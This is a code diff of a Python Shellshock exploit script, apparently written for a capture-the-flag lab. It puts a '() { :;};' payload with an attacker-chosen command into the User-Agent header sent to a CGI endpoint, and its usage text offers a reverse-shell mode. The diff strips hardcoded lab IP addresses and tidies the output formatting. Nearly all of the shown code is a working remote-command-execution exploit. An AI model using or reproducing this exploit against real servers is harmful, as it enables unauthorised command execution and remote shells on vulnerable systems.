@@ -5,11 +5,6 @@ from sys import argv
 from string import ascii_letters
 from random import choice
 
-localPort = '9999'
-localIP = '10.10.14.48'
-cmd = '/usr/bin/id'
-address = 'http://10.129.1.175/cgi-bin/user.sh'
-
 def exploit(address, command):
 	payload = '() { :;};' + command 
 	headers = {'User-Agent':payload}
@@ -24,7 +19,7 @@ def usage():
 	print('Usage for commands:')
 	print(f'\t{argv[0]} cmd <address> <command>\n')
 	print('Usage for reverse shell:')
-	print(f'\t{argv[0]} rev <local ip> <local port> <address>')
+	print(f'\t{argv[0]} rev <local ip> <local port> <address>\n')
 	quit()
 
 def main():
@@ -43,12 +38,12 @@ def main():
 		end = ''.join(choice(ascii_letters) for i in range(10))
 		cmd = ' '.join(argv[3:])
 		command = 'echo -e "\\r\\n' + start + '$(' + cmd + ')' + end + '"'
-		print(f'Sending command: {cmd}')
-		success, response = exploit(address, command)
+		print(f'Sending command: {cmd}\n')
+		success, response = exploit(argv[2], command)
 		if success:
-			print(f'[+] {response.split(start)[1].split(end)[0]}')
+			print(f'[+] {response.split(start)[1].split(end)[0]}\n')
 		else:
-			print(f'[-] Error Code: {response}')
+			print(f'[-] Error Code: {response}\n')
 
 	else:
 		usage()
